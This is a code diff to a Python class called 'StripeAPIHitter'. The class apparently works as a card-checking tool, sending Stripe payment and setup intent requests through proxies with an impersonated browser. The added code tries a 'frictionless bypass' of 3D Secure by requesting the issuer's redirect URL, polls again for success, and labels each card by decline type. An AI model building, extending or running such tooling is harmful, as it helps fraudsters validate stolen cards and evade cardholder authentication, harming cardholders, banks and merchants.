@@ -705,6 +705,9 @@ class StripeAPIHitter:
                 if confirm_res.status_code == 200:
                     pi = confirm_json.get('payment_intent', {})
                     si = confirm_json.get('setup_intent', {})
+                    intent_id = pi.get('id') if isinstance(pi, dict) and pi.get('id') else (si.get('id') if isinstance(si, dict) else None)
+                    client_secret = pi.get('client_secret') if isinstance(pi, dict) and pi.get('client_secret') else (si.get('client_secret') if isinstance(si, dict) else None)
+                    is_setup_intent = bool(si) or (isinstance(intent_id, str) and 'seti' in intent_id)
                     
                     if isinstance(pi, dict) and pi.get('last_payment_error'):
                         err = pi.get('last_payment_error')
@@ -816,6 +819,31 @@ class StripeAPIHitter:
                                     if status_2 in ['succeeded', 'requires_capture', 'complete']:
                                         result['success'] = True
                                     else:
+                                        next_act_2 = poll_json.get('next_action') or {}
+                                        if status_2 == 'requires_action' and next_act_2.get('type') == 'redirect_to_url':
+                                            redirect_url = next_act_2.get('redirect_to_url', {}).get('url')
+                                            return_url = next_act_2.get('redirect_to_url', {}).get('return_url')
+                                            if redirect_url:
+                                                print(f"DEBUG: 3DS2 failed/unsupported. Falling back to 3DS1 redirect: {redirect_url}", flush=True)
+                                                # Attempt frictionless bypass by hitting the hooks URL with our impersonated browser
+                                                await loop.run_in_executor(None, lambda: cffi_requests.get(redirect_url, headers=headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
+                                                
+                                                # Poll the intent again to see if frictionless succeeded
+                                                poll_url_3 = f"https://api.stripe.com/v1/setup_intents/{intent_id}?key={self.pk_live}" if is_setup_intent else f"https://api.stripe.com/v1/payment_intents/{intent_id}?key={self.pk_live}"
+                                                poll_res_3 = await loop.run_in_executor(None, lambda: cffi_requests.get(poll_url_3, headers=headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
+                                                poll_json_3 = poll_res_3.json()
+                                                poll_status_3 = poll_json_3.get('status')
+                                                
+                                                if poll_status_3 in ['succeeded', 'requires_capture', 'complete']:
+                                                    result['success'] = True
+                                                    result['final_url'] = return_url or redirect_url
+                                                    return result
+                                                    
+                                                result['decline_code'] = '3d_secure_required_hard'
+                                                result['error'] = 'Card issuer demands interactive 3D Secure authentication (Bank-side OTP/App approval required).'
+                                                result['final_url'] = return_url or redirect_url
+                                                return result
+                                                
                                         err = poll_json.get('last_payment_error') or poll_json.get('last_setup_error') or poll_json.get('error') or {}
                                         if status_2 == 'requires_action' and 'data' in locals():
                                             if data.get('error'):
